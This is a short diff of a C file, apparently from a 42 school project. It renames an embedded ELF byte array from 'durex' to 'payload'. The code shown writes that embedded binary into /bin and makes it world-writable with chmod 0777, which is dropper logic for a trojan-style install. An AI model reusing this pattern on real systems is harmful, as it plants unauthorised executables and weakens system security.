@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/01 12:15:37 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/13 14:43:40 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/13 15:14:25 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,7 +19,7 @@ int		main()
 		return (0);
 	}
 
-	unsigned char durex[] = {
+	unsigned char payload[] = {
 	  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
 	  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
 	  0xe0, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
@@ -1603,7 +1603,7 @@ int		main()
 	snprintf(bin_dest, sizeof(bin_dest), "/bin/%s", bin);
 	f = fopen(bin_dest, "w");
 	Xv(NULL, f, "fopen");
-	fwrite(durex, sizeof(char), sizeof(durex), f);
+	fwrite(payload, sizeof(char), sizeof(payload), f);
 	fclose(f);
 	chmod(bin_dest, 0777);
 
